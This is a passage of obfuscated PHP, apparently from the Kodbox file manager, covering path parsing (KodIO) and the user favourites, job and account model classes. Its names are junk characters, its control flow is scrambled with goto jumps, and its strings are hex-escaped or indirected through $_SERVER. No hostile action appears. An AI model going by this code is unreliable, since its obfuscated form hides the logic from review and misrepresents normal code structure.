KodIO::KOD_SOURCE) { $f”ŞÙ ¬‚‘ = Model($D­‰¯™½œ‹[752])->fileInfoGet(KodIO::sourceID($eº”¶©‹Ú†)); if (!$f”ŞÙ ¬‚‘[$D­‰¯™½œ‹[75]]) { show_json($D­‰¯™½œ‹[1043], !1); } $eº”¶©‹Ú† = $f”ŞÙ ¬‚‘[$D­‰¯™½œ‹[75]]; } $EÌŠÜƒ®­£ = self::init($eº”¶©‹Ú†); $cî­¹¥›Ì = $EÌŠÜƒ®­£->getType(); goto c®‹ùäã•Á; c®‹ùäã•Á: if ($cî­¹¥›Ì == $D­‰¯™½œ‹[103] || $cî­¹¥›Ì == $D­‰¯™½œ‹[1044]) { if (!$EÌŠÜƒ®­£->exist($EÌŠÜƒ®­£->path)) { show_json(LNG($D­‰¯™½œ‹[102]), !1); } return $EÌŠÜƒ®­£->path; } return !1; goto fíà¾Ÿñå; B³Ş‹Ÿå¡³: $D­‰¯™½œ‹ =& $_SERVER[¢à]; if ($bÚÜÓ˜•‹‚ == $D­‰¯™½œ‹[1041] && strtoupper(substr(PHP_OS, 0, 3)) == $D­‰¯™½œ‹[1042]) { return !1; } $A»ç‚†‚í = KodIO::parse($eº”¶©‹Ú†); goto c¼åÓÔ¼ŸÛ; fíà¾Ÿñå: } private static function archiveExt($BÆïÏ‚òõ = '') { $GLOBALS[$_SERVER[¢à][1045]] = $BÆïÏ‚òõ; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\162\122\145\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\x46\x69\154\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\x46\x69\x6c\145\x54\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\x52\157\157\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\x53\x68\x61\x72\145\114\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\141\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\x65\x49\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\162\145\x49\x74\x65\155\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\143\153\175"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\162\122\145\x6e\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\175"; public static function typeList() { $cÂÓÎ§Ï¥‡ =& $_SERVER[¢à]; return array($cÂÓÎ§Ï¥‡[1046] => self::KOD_SOURCE, $cÂÓÎ§Ï¥‡[1047] => self::KOD_USER_RECYCLE, $cÂÓÎ§Ï¥‡[1048] => self::KOD_USER_FAV, $cÂÓÎ§Ï¥‡[1049] => self::KOD_USER_FILE_TAG, $cÂÓÎ§Ï¥‡[1050] => self::KOD_USER_FILE_TYPE, $cÂÓÎ§Ï¥‡[1051] => self::KOD_GROUP_ROOT_SELF, $cÂÓÎ§Ï¥‡[1052] => self::KOD_USER_SHARE, $cÂÓÎ§Ï¥‡[1053] => self::KOD_USER_SHARE_LINK, $cÂÓÎ§Ï¥‡[1054] => self::KOD_USER_SHARE_TO_ME, $cÂÓÎ§Ï¥‡[1055] => self::KOD_SHARE_ITEM, $cÂÓÎ§Ï¥‡[1056] => self::KOD_SHARE_LINK, $cÂÓÎ§Ï¥‡[1057] => self::KOD_SEARCH, $cÂÓÎ§Ï¥‡[1058] => self::KOD_BLOCK, $cÂÓÎ§Ï¥‡[1059] => self::KOD_IO, $cÂÓÎ§Ï¥‡[1060] => self::KOD_USER_RECENT, $cÂÓÎ§Ï¥‡[1061] => self::KOD_USER_DRIVER); } public static function parse($F¼Ö¼Ş¾¦­) { goto f¯â‘‹»•·; f¯â‘‹»•·: $AªŞ³Ÿ“… =& $_SERVER[¢à]; $F¼Ö¼Ş¾¦­ = self::clear($F¼Ö¼Ş¾¦­); $FØµìÑ¿– = array_values(self::typeList()); goto f‰Ñ¾„œ; cëÁ±ì¨ì: $a×ò¢ñä§• = array($AªŞ³Ÿ“…[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $F¥µŠì…×[$AªŞ³Ÿ“…[1066]] = in_array($F¥µŠì…×[$AªŞ³Ÿ“…[29]], $a×ò¢ñä§•); return $F¥µŠì…×; goto C¾•ê¾¼‡; f‰Ñ¾„œ: preg_match($AªŞ³Ÿ“…[1062], $F¼Ö¼Ş¾¦­, $d•°ÍÚˆÜù); $F¥µŠì…× = array($AªŞ³Ÿ“…[385] => !1, $AªŞ³Ÿ“…[1063] => !1, $AªŞ³Ÿ“…[382] => !1, $AªŞ³Ÿ“…[75] => $F¼Ö¼Ş¾¦­, $AªŞ³Ÿ“…[1008] => !1, $AªŞ³Ÿ“…[1007] => $AªŞ³Ÿ“…[33]); if (is_array($d•°ÍÚˆÜù) && count($d•°ÍÚˆÜù) == 5) { $eì…¼á¥´– = $AªŞ³Ÿ“…[1064] . $d•°ÍÚˆÜù[2] . $AªŞ³Ÿ“…[312]; if (in_array($eì…¼á¥´–, $FØµìÑ¿–)) { $F¥µŠì…×[$AªŞ³Ÿ“…[1008]] = $d•°ÍÚˆÜù[1]; $F¥µŠì…×[$AªŞ³Ÿ“…[29]] = $eì…¼á¥´–; $F¥µŠì…×[$AªŞ³Ÿ“…[1065]] = substr($eì…¼á¥´–, 1, -1); $F¥µŠì…×[$AªŞ³Ÿ“…[364]] = $d•°ÍÚˆÜù[3]; } $F¥µŠì…×[$AªŞ³Ÿ“…[1007]] = $d•°ÍÚˆÜù[4]; } goto cëÁ±ì¨ì; C¾•ê¾¼‡: } public static function clear($CŠÔ…¤‘µ) { goto Bèñß‡ô‰; A´÷ù½Ø¢: if ($CŠÔ…¤‘µ == $cÄ¦È›ºÄ[8]) { return $cÄ¦È›ºÄ[8]; } $CŠÔ…¤‘µ = rtrim($CŠÔ…¤‘µ, $cÄ¦È›ºÄ[8]); return $CŠÔ…¤‘µ; goto Då·äé‹ÎÛ; DÀ—³³Ó™: if (substr($CŠÔ…¤‘µ, 0, 3) == $cÄ¦È›ºÄ[1068]) { $CŠÔ…¤‘µ = substr($CŠÔ…¤‘µ, 3); } while (strstr($CŠÔ…¤‘µ, $ašÄñÒöÃÌ)) { $CŠÔ…¤‘µ = str_replace($ašÄñÒöÃÌ, $cÄ¦È›ºÄ[8], $CŠÔ…¤‘µ); } $CŠÔ…¤‘µ = preg_replace($cÄ¦È›ºÄ[1069], $cÄ¦È›ºÄ[8], $CŠÔ…¤‘µ); goto A´÷ù½Ø¢; Bèñß‡ô‰: $cÄ¦È›ºÄ =& $_SERVER[¢à]; $CŠÔ…¤‘µ = str_replace($cÄ¦È›ºÄ[95], $cÄ¦È›ºÄ[8], $CŠÔ…¤‘µ); $ašÄñÒöÃÌ = $cÄ¦È›ºÄ[1067]; goto DÀ—³³Ó™; Då·äé‹ÎÛ: } public static function sourceID($a‰·î¨”ó´) { $DÏ°¾ã‰âÜ =& $_SERVER[¢à]; $f«‚œê‡”á = self::parse($a‰·î¨”ó´); if ($f«‚œê‡”á[$DÏ°¾ã‰âÜ[29]] !== self::KOD_SOURCE) { show_json(LNG($DÏ°¾ã‰âÜ[1070]), !1); } return $f«‚œê‡”á[$DÏ°¾ã‰âÜ[364]]; } public static function make($d•·ãî‘÷è) { if (!$d•·ãî‘÷è) { return !1; } return self::makePath(self::KOD_SOURCE, intval($d•·ãî‘÷è)); } public static function makeShare($Dœ¢Š†‰„, $AÛ¬­†ê§¿) { return self::makePath(self::KOD_SHARE_ITEM, $Dœ¢Š†‰„, $AÛ¬­†ê§¿); } public static function makeFileTypePath($Bš”¢šäˆ) { return self::makePath(self::KOD_USER_FILE_TYPE, $Bš”¢šäˆ); } public static function makeFileTagPath($bˆ¼Íİ­šß) { return self::makePath(self::KOD_USER_FILE_TAG, $bˆ¼Íİ­šß); } public static function makePath($d‘Œé¥˜á², $B‹èÃØŸò£ = '', $aŞ·¤‚Ã = '') { $CêÅ¦İÛó† =& $_SERVER[¢à]; $aâ¥‹¥ôíé = substr($d‘Œé¥˜á², 1, -1); $cç¶§Œ„¥Õ = $CêÅ¦İÛó†[1071] . $aâ¥‹¥ôíé . $CêÅ¦İÛó†[1072] . $B‹èÃØŸò£ . $CêÅ¦İÛó†[1073]; $cç¶§Œ„¥Õ = $aŞ·¤‚Ã ? $cç¶§Œ„¥Õ . $aŞ·¤‚Ã . $CêÅ¦İÛó†[8] : $cç¶§Œ„¥Õ; return $cç¶§Œ„¥Õ; } public static function hashPath($f¥»é‰î ) { $fŠ‹ÄÁáÔå =& $_SERVER[¢à]; $d˜§ƒíÏ»È = is_array($f¥»é‰î ) ? $f¥»é‰î  : IO::info($f¥»é‰î ); $cÜ’–„Ù« = _get($d˜§ƒíÏ»È, $fŠ‹ÄÁáÔå[1074], $fŠ‹ÄÁáÔå[33]); if (!$cÜ’–„Ù«) { $Aõæ¹õ†‘ = KodIO::parse($d˜§ƒíÏ»È[$fŠ‹ÄÁáÔå[75]]); if (!$Aõæ¹õ†‘[$fŠ‹ÄÁáÔå[29]]) { $cÜ’–„Ù« = IO::hashSimple($d˜§ƒíÏ»È[$fŠ‹ÄÁáÔå[75]]); } } if (!$cÜ’–„Ù«) { $cÜ’–„Ù« = md5($d˜§ƒíÏ»È[$fŠ‹ÄÁáÔå[75]] . $d˜§ƒíÏ»È[$fŠ‹ÄÁáÔå[77]] . $d˜§ƒíÏ»È[$fŠ‹ÄÁáÔå[107]]); } return $cÜ’–„Ù«; } public static function initSystemPath() { $eğ‰ïìÃŠË =& $_SERVER[¢à]; if (defined($eğ‰ïìÃŠË[1075])) { return; } define($eğ‰ïìÃŠË[1075], self::systemPath($eğ‰ïìÃŠË[1076])); define($eğ‰ïìÃŠË[1077], self::systemPath($eğ‰ïìÃŠË[1078])); define($eğ‰ïìÃŠË[1079], self::systemPath($eğ‰ïìÃŠË[1080])); define($eğ‰ïìÃŠË[1081], self::systemPath($eğ‰ïìÃŠË[1082])); } private static function systemPath($D©Ê´é½ïˆ) { goto C‡”ÀŒƒèÔ; fç²¡Ìéê†: if ($Aã³òÙ›°î) { return $Aã³òÙ›°î; } if ($D©Ê´é½ïˆ == $FÙëŠ‡ ¥ó[1076]) { $Aã³òÙ›°î = self::make(Model($FÙëŠ‡ ¥ó[752])->systemRootPathAdd($FÙëŠ‡ ¥ó[1085])); } else { $Aã³òÙ›°î = self::systemPath($FÙëŠ‡ ¥ó[1076]); $eƒ´õ”òŠ† = self::sourceID($Aã³òÙ›°î); $Aã³òÙ›°î = self::make(Model($FÙëŠ‡ ¥ó[752])->mkdir($eƒ´õ”òŠ†, $D©Ê´é½ïˆ)); } Model($FÙëŠ‡ ¥ó[1084])->set($c°´¼‹²…±, $Aã³òÙ›°î); goto E¸ÉŸº®Âš; C‡”ÀŒƒèÔ: $FÙëŠ‡ ¥ó =& $_SERVER[¢à]; $c°´¼‹²…± = $FÙëŠ‡ ¥ó[1083] . ucfirst($D©Ê´é½ïˆ); $Aã³òÙ›°î = Model($FÙëŠ‡ ¥ó[1084])->get($c°´¼‹²…±); goto fç²¡Ìéê†; E¸ÉŸº®Âš: return $Aã³òÙ›°î; goto D­™…Ş…; D­™…Ş…: } public static function systemFolder($cŒ¬¡œÃÆš) { $aÖ¥½Şœˆ‡ = IO_PATH_SYSTEM_SOURCE . $cŒ¬¡œÃÆš; $bùéŞ·»ˆ¸ = Cache::get($aÖ¥½Şœˆ‡); if (!$bùéŞ·»ˆ¸) { $bğÂÀ¯íÀ = IO::infoFull($aÖ¥½Şœˆ‡); if (!$bğÂÀ¯íÀ) { $bùéŞ·»ˆ¸ = IO::mkdir($aÖ¥½Şœˆ‡, REPEAT_SKIP); } else { $bùéŞ·»ˆ¸ = $bğÂÀ¯íÀ[$_SERVER[¢à][75]]; } Cache::set($aÖ¥½Şœˆ‡, $bùéŞ·»ˆ¸, 3600 * 10); } return $bùéŞ·»ˆ¸; } public static function defaultDriver() { return Model($_SERVER[¢à][704])->defaultDriver(); } public static function defaultIO() { $E±Êğ‚êÒâ =& $_SERVER[¢à]; $FŒ™ïêœà = self::defaultDriver(); return $E±Êğ‚êÒâ[1086] . $FŒ™ïêœà[$E±Êğ‚êÒâ[364]] . $E±Êğ‚êÒâ[1073]; } public static function fileTypeList() { $b‰ƒº´ÕŞ =& $_SERVER[¢à]; $d‹ßÜ’™Â = $GLOBALS[$b‰ƒº´ÕŞ[6]][$b‰ƒº´ÕŞ[1087]]; foreach ($d‹ßÜ’™Â as $EÅçñ”œ¬ => $D§éÛë) { $DŠæã½°œå = $b‰ƒº´ÕŞ[1088] . $EÅçñ”œ¬; $F³ª¦¤àÆÒ = LNG($DŠæã½°œå); if ($DŠæã½°œå != $F³ª¦¤àÆÒ) { $d‹ßÜ’™Â[$EÅçñ”œ¬][$b‰ƒº´ÕŞ[28]] = $F³ª¦¤àÆÒ; } } return $d‹ßÜ’™Â; } } goto AÖšÈ¥–Å÷; fâÛ“¼˜æ: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\141\166"; protected function cacheFunctionAlias($f¹â÷›Ü¥) { $d§Áàø· =& $_SERVER[¢à]; return array($d§Áàø·[2447] => array(USER_ID, $d§Áàø·[2448])); } protected function listData() { $e¢–ßß‹Ô =& $_SERVER[¢à]; $dËãˆ¾•ËÛ = array($e¢–ßß‹Ô[1403] => USER_ID, $e¢–ßß‹Ô[432] => 0); $bîÑê÷Ã‚ = $e¢–ßß‹Ô[2449]; $Dë¤Ãå±‡Ÿ = $this->field($bîÑê÷Ã‚)->where($dËãˆ¾•ËÛ)->order($e¢–ßß‹Ô[2450])->select(); return $Dë¤Ãå±‡Ÿ ? $Dë¤Ãå±‡Ÿ : array(); } protected function resetCache() { } protected function listView() { goto e£½Åæ¿¼¿; Aß…‹æ›ˆã: $d…Åˆ–”’ä = array_to_keyvalue($d…Åˆ–”’ä, $dª“Âùæï[366]); foreach ($b³Ä‚øï— as $b¤±æÕÏ®¾ => $B£Ñ¾ä°†Û) { $cÍÊïÙÓ®Û = $d…Åˆ–”’ä[$B£Ñ¾ä°†Û[$dª“Âùæï[75]]]; $cÍÊïÙÓ®Û = $cÍÊïÙÓ®Û ? $cÍÊïÙÓ®Û : array(); $b³Ä‚øï—[$b¤±æÕÏ®¾] = array_merge($cÍÊïÙÓ®Û, $B£Ñ¾ä°†Û); } return $b³Ä‚øï—; goto aéÇæÜ¥İË; e£½Åæ¿¼¿: $dª“Âùæï =& $_SERVER[¢à]; $b³Ä‚øï— = $this->listData(); $Dª×¹–²¢‚ = array_filter_by_field($b³Ä‚øï—, $dª“Âùæï[29], $dª“Âùæï[379]); goto AÁ´ëğæ‘Ù; Fİªß‰©İ: $f†¬îÚó•á = array($dª“Âùæï[380] => array($dª“Âùæï[381], $Eñ­É©Æ©)); $d…Åˆ–”’ä = Model($dª“Âùæï[752])->listSource($f†¬îÚó•á, $DñåÑ»ŠõŠ); $d…Åˆ–”’ä = array_merge($d…Åˆ–”’ä[$dª“Âùæï[73]], $d…Åˆ–”’ä[$dª“Âùæï[74]]); goto Aß…‹æ›ˆã; AÁ´ëğæ‘Ù: $Eñ­É©Æ© = array_to_keyvalue($Dª×¹–²¢‚, $dª“Âùæï[33], $dª“Âùæï[75]); if (!$Eñ­É©Æ©) { return $b³Ä‚øï—; } $DñåÑ»ŠõŠ = 2000; goto Fİªß‰©İ; aéÇæÜ¥İË: } protected function addFav($AÏ‰Œ¶Áè‹, $BÚ½µÉãùá = '', $aŞ©÷§«Ãİ = "\163\x6f\165\162\x63\x65") { goto C—èÌ„Ñ…Œ; D¢ØŒ§³ùé: $fàÀâÀÎš = array($Aƒ¾Àó[1403] => USER_ID, $Aƒ¾Àó[432] => 0); $aç«¥™ƒ…¿ = $this->where($fàÀâÀÎš)->max($Aƒ¾Àó[2096]); if (!$aç«¥™ƒ…¿) { $aç«¥™ƒ…¿ = 0; } goto fŠŒ‡×‘à¸; fŠŒ‡×‘à¸: if (!$BÚ½µÉãùá && $aŞ©÷§«Ãİ == $Aƒ¾Àó[379]) { $aĞ‰•¼Ş…± = Model($Aƒ¾Àó[1106])->where(array($Aƒ¾Àó[380] => $AÏ‰Œ¶Áè‹))->find(); if (!$aĞ‰•¼Ş…±) { return !1; } $BÚ½µÉãùá = $aĞ‰•¼Ş…±[$Aƒ¾Àó[28]]; } $BÚ½µÉãùá = $this->getAutoName($BÚ½µÉãùá); $D÷øÖ–“Ì = array($Aƒ¾Àó[1403] => USER_ID, $Aƒ¾Àó[432] => 0, $Aƒ¾Àó[383] => $BÚ½µÉãùá, $Aƒ¾Àó[384] => $AÏ‰Œ¶Áè‹, $Aƒ¾Àó[385] => $aŞ©÷§«Ãİ, $Aƒ¾Àó[2079] => $aç«¥™ƒ…¿ + 1); goto DóÛÉ•‰Æ­; C—èÌ„Ñ…Œ: $Aƒ¾Àó =& $_SERVER[¢à]; $fàÀâÀÎš = array($Aƒ¾Àó[1403] => USER_ID, $Aƒ¾Àó[432] => 0, $Aƒ¾Àó[385] => $aŞ©÷§«Ãİ, $Aƒ¾Àó[384] => $AÏ‰Œ¶Áè‹); if ($this->where($fàÀâÀÎš)->find()) { return !1; } goto D¢ØŒ§³ùé; DóÛÉ•‰Æ­: return $this->add($D÷øÖ–“Ì); goto e‰¤æ«¤…³; e‰¤æ«¤…³: } protected function remove($b½ö©ÎôŠä) { $b«ïÈÀ½ =& $_SERVER[¢à]; $B†ÏËî‘’“ = array($b«ïÈÀ½[1403] => USER_ID, $b«ïÈÀ½[382] => $b½ö©ÎôŠä); return $this->where($B†ÏËî‘’“)->delete(); } protected function removeByName($BãòÕÅé†Ì) { $aà´¨Ëç„ =& $_SERVER[¢à]; $d‘ŞÊ ©ˆ = array($aà´¨Ëç„[1403] => USER_ID, $aà´¨Ëç„[383] => $BãòÕÅé†Ì, $aà´¨Ëç„[432] => 0); return $this->where($d‘ŞÊ ©ˆ)->delete(); } protected function rename($Aå¨˜»–¾, $A²Ã¬´ãïÏ) { $dô ƒŞÃ´§ =& $_SERVER[¢à]; if ($Aå¨˜»–¾ == $A²Ã¬´ãïÏ) { return !1; } $BšÆ„Š¤² = $this->getAutoName($A²Ã¬´ãïÏ); if ($A²Ã¬´ãïÏ != $BšÆ„Š¤²) { return !1; } $aÈ‰¦‚³§É = array($dô ƒŞÃ´§[1403] => USER_ID, $dô ƒŞÃ´§[432] => 0, $dô ƒŞÃ´§[28] => $Aå¨˜»–¾); return $this->where($aÈ‰¦‚³§É)->save(array($dô ƒŞÃ´§[28] => $A²Ã¬´ãïÏ)); } protected function resetSort($e·Æ³‡ˆìó) { $F«Ö…—¬ôº =& $_SERVER[¢à]; $e·Æ³‡ˆìó = is_array($e·Æ³‡ˆìó) ? $e·Æ³‡ˆìó : array(); $dùšŞˆğ°¸ = array($F«Ö…—¬ôº[1403] => USER_ID); for ($EóÎÜù‘ˆ = 0; $EóÎÜù‘ˆ < count($e·Æ³‡ˆìó); $EóÎÜù‘ˆ++) { $dùšŞˆğ°¸[$F«Ö…—¬ôº[382]] = $e·Æ³‡ˆìó[$EóÎÜù‘ˆ]; $this->where($dùšŞˆğ°¸)->save(array($F«Ö…—¬ôº[2079] => $EóÎÜù‘ˆ + 1)); } return !0; } protected function moveTop($bÜ„Ú²é­Ï) { goto bÑøÓÜ²…ˆ; AØ–ÕğŒğ¶: if (!$F‘†˜ì´ç½) { return; } $AÌœ¿¿Ñø = $this->field($EÛ«’ŞöË[364])->where($CÁåÚ«çğä)->order($EÛ«’ŞöË[2450])->select(); $AÌœ¿¿Ñø = array_to_keyvalue($AÌœ¿¿Ñø, $EÛ«’ŞöË[33], $EÛ«’ŞöË[364]); goto Bïéñ‹šĞ; Bïéñ‹šĞ: $e”™Ü¥Ş² = $AÌœ¿¿Ñø; $AÌœ¿¿Ñø = array_remove_value($AÌœ¿¿Ñø, $F‘†˜ì´ç½[$EÛ«’ŞöË[364]]); array_unshift($AÌœ¿¿Ñø, $F‘†˜ì´ç½[$EÛ«’ŞöË[364]]); goto BÖÊ•ºª×ä; bÑøÓÜ²…ˆ: $EÛ«’ŞöË =& $_SERVER[¢à]; $CÁåÚ«çğä = array($EÛ«’ŞöË[1403] => USER_ID, $EÛ«’ŞöË[432] => 0); $F‘†˜ì´ç½ = $this->where($CÁåÚ«çğä)->where(array($EÛ«’ŞöË[28] => $bÜ„Ú²é­Ï))->find(); goto AØ–ÕğŒğ¶; BÖÊ•ºª×ä: return $this->resetSort($AÌœ¿¿Ñø); goto eÚ‘«Á¶µÒ; eÚ‘«Á¶µÒ: } protected function moveBottom($E÷¸í¹Ê¿™) { $C¼ÂìÈ£Î’ =& $_SERVER[¢à]; $B„”©Œ±İÕ = array($C¼ÂìÈ£Î’[1403] => USER_ID, $C¼ÂìÈ£Î’[432] => 0); $BÜå‡ŸÚÉó = $this->where($B„”©Œ±İÕ)->max($C¼ÂìÈ£Î’[2096]); $AŒŞà‰³À• = array($C¼ÂìÈ£Î’[2096] => $BÜå‡ŸÚÉó + 1); return $this->where($B„”©Œ±İÕ)->where(array($C¼ÂìÈ£Î’[28] => $E÷¸í¹Ê¿™))->save($AŒŞà‰³À•); } private function getAutoName($f¸Îƒª±·) { goto cˆç›àÑ÷à; cˆç›àÑ÷à: $cƒÌÏ“ŠÏœ =& $_SERVER[¢à]; $DòÄ„ÀÇ¬õ = array($cƒÌÏ“ŠÏœ[1403] => USER_ID, $cƒÌÏ“ŠÏœ[432] => 0); $EïŒò°Áà» = $this->field($cƒÌÏ“ŠÏœ[28])->where($DòÄ„ÀÇ¬õ)->select(); goto Eƒ‡ìó¯…ù; Eƒ‡ìó¯…ù: $EïŒò°Áà» = array_to_keyvalue($EïŒò°Áà», $cƒÌÏ“ŠÏœ[33], $cƒÌÏ“ŠÏœ[28]); if (!$EïŒò°Áà» || !in_array($f¸Îƒª±·, $EïŒò°Áà»)) { return $f¸Îƒª±·; } for ($aæ‡Ş˜çìÅ = 0; $aæ‡Ş˜çìÅ < count($EïŒò°Áà»); $aæ‡Ş˜çìÅ++) { if (!in_array($f¸Îƒª±· . "\50{$aæ‡Ş˜çìÅ}\x29", $EïŒò°Áà»)) { return $f¸Îƒª±· . "\x28{$aæ‡Ş˜çìÅ}\x29"; } } goto FÃ†î¹Ê…Õ; FÃ†î¹Ê…Õ: return $f¸Îƒª±· . "\x28{$aæ‡Ş˜çìÅ}\x29"; goto c”ÏÜ¸˜É; c”ÏÜ¸˜É: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\152\157\x62\x4c\151\163\x74"; public $field = array("\156\141\x6d\145", "\144\x65\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\154\146\112\157\x62\114\151\x73\x74"; public function listData($E²Ó¨Ç›ˆ¦ = false, $Eëé ÇªÅ  = "\163\x6f\x72\x74", $Fˆ§î¯ŒµË = false) { return parent::listData($E²Ó¨Ç›ˆ¦, $Eëé ÇªÅ , $Fˆ§î¯ŒµË); } public function remove($d¦³ªìÅØ) { return parent::remove($d¦³ªìÅØ); } public function add($DğÓâŒ°È˜) { $föÂËŠê¾ª =& $_SERVER[¢à]; if ($this->findByName($DğÓâŒ°È˜[$föÂËŠê¾ª[28]])) { return !1; } $DğÓâŒ°È˜[$föÂËŠê¾ª[2096]] = $this->getSort(); return parent::insert($DğÓâŒ°È˜); } private function getSort() { $CšÉƒõ°¬‚ =& $_SERVER[¢à]; $BÄ›ŠßÏğ‚ = parent::listData(); $fßŠé¯ˆ‡Ù = array_to_keyvalue($BÄ›ŠßÏğ‚, $CšÉƒõ°¬‚[33], $CšÉƒõ°¬‚[2096]); return empty($fßŠé¯ˆ‡Ù) ? 0 : max($fßŠé¯ˆ‡Ù) + 1; } public function update($CØÏ¯Ê­, $FÚ—Èğ—»ç) { $C™ªíÏ¤Ô =& $_SERVER[¢à]; $cÛ‚ß§¤×‚ = parent::listData($CØÏ¯Ê­); $fºøÖ‘¹¦Û = $this->findByName($FÚ—Èğ—»ç[$C™ªíÏ¤Ô[28]]); if (!$cÛ‚ß§¤×‚ || $fºøÖ‘¹¦Û && $fºøÖ‘¹¦Û[$C™ªíÏ¤Ô[364]] != $cÛ‚ß§¤×‚[$C™ªíÏ¤Ô[364]]) { return !1; } return parent::update($CØÏ¯Ê­, $FÚ—Èğ—»ç); } public function setUserJob($e‹¦Úœ, $B›…°øÍõÛ) { goto CìÆ…‰Úß; DğƒäéÕÏ: $bğ—É‡Ô = rtrim($bğ—É‡Ô, $Fğ†Ò‹êêº[47]); Model($Fğ†Ò‹êêº[473])->metaSet($e‹¦Úœ, self::JOB_KEY, $bğ—É‡Ô); goto d°Æ¦¨êªë; C’äè¶©Íö: $b¥îßøÕä = array_to_keyvalue($cäÛÕ±ˆïÑ, $Fğ†Ò‹êêº[28]); $bğ—É‡Ô = $Fğ†Ò‹êêº[358]; foreach ($B›…°øÍõÛ as $A×ğí»Š“«) { if ($b¥îßøÕä[$A×ğí»Š“«]) { $bğ—É‡Ô .= $b¥îßøÕä[$A×ğí»Š“«][$Fğ†Ò‹êêº[364]] . $Fğ†Ò‹êêº[47]; } else { $A¯î½‡¥šò = $this->add($A×ğí»Š“«); $bğ—É‡Ô .= $A¯î½‡¥šò . $Fğ†Ò‹êêº[47]; } } goto DğƒäéÕÏ; CìÆ…‰Úß: $Fğ†Ò‹êêº =& $_SERVER[¢à]; if (!is_array($B›…°øÍõÛ)) { $B›…°øÍõÛ = array($B›…°øÍõÛ); } $cäÛÕ±ˆïÑ = parent::listData(); goto C’äè¶©Íö; d°Æ¦¨êªë: } public function getUserJob($b¢øŒ×ìË) { $DÁ‚ÚóÜç = Model($_SERVER[¢à][473])->metaGet($b¢øŒ×ìË); return $this->getUserJobInfo($DÁ‚ÚóÜç[self::JOB_KEY]); } public function getUserJobInfo($b¯¿¢ Ô¡ª) { goto a´ƒ³Ãé“¬; b÷‰ç¹Šº: $E˜Ö¿¹à = array_remove_key($E˜Ö¿¹à, $fÔ¡à„‚…•[184]); $a¼‚Ğ¦ó¸ = array(); foreach ($C§Œ«ºÃÍÈ as $eÚÀÈ‹ëĞ) { if (isset($E˜Ö¿¹à[$eÚÀÈ‹ëĞ])) { $a¼‚Ğ¦ó¸[] = $E˜Ö¿¹à[$eÚÀÈ‹ëĞ]; } } goto eÌÌ¶Ğ»ß¤; a´ƒ³Ãé“¬: $fÔ¡à„‚…• =& $_SERVER[¢à]; $C§Œ«ºÃÍÈ = explode($fÔ¡à„‚…•[47], $b¯¿¢ Ô¡ª); $E˜Ö¿¹à = parent::listData(); goto b÷‰ç¹Šº; eÌÌ¶Ğ»ß¤: return $a¼‚Ğ¦ó¸; goto fˆëÈÒïøƒ; fˆëÈÒïøƒ: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\145" => "\x75\163\145\x72\x5f\x6d\x65\164\x61", "\155\x65\x74\141\106\x69\145\154\x64" => "\165\x73\145\x72\111\x44"); protected $simpleField = "\165\x73\145\x72\111\104\54\x6e\x69\143\x6b\x4e\x61\155\x65\54\156\141\x6d\x65\x2c\141\x76\x61\x74\x61\x72\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($E ¾±Åä™™) { $Cê¿°òœØÀ =& $_SERVER[¢à]; $Cá‡©÷‘õõ = $Cê¿°òœØÀ[2451]; return array($Cê¿°òœØÀ[2141] => array($E ¾±Åä™™[0], $Cá‡©÷‘õõ), $Cê¿°òœØÀ[2143] => array($E ¾±Åä™™[0], $Cá‡©÷‘õõ), $Cê¿°òœØÀ[2452] => array($E ¾±Åä™™[0], $Cá‡©÷‘õõ)); } protected function getInfo($B§àÌ¼šß—, $A›äŸˆ–÷ = false) { $B‘õÈÅÔ¸† = $this->getInfoSimple($B§àÌ¼šß—); if (!is_array($B‘õÈÅÔ¸†)) { return array(); } if ($A›äŸˆ–÷) { return $this->_getInfoApply($B‘õÈÅÔ¸†); } return $this->cacheFunctionGet($_SERVER[¢à][2183], $B§àÌ¼šß—); } protected function getInfoFull($dâäÀĞ˜‚, $fÇª«ëÎ‡Š = false) { $e”´Ğóºé = $this->getInfoSimple($dâäÀĞ˜‚); if (!is_array($e”´Ğóºé)) { return array(); } if ($fÇª«ëÎ‡Š) { return $this->_getInfoApply($e”´Ğóºé, !0); return $this->_getInfoApply($e”´Ğóºé, !0); } return $this->cacheFunctionGet($_SERVER[¢à][2453], $dâäÀĞ˜‚); } private function _getInfoApply($b…È¢ Ü, $eß»Î³‹»“ = false) { goto Fâ†¦Äğ—è; aïµ†ÆÒã: $b…È¢ Ü = $this->_listDataApplyItem($b…È¢ Ü); $a­ê—¸‘‰ò = Model($AÃºîÙ§ùŸ[1106])->metaGet($b…È¢ 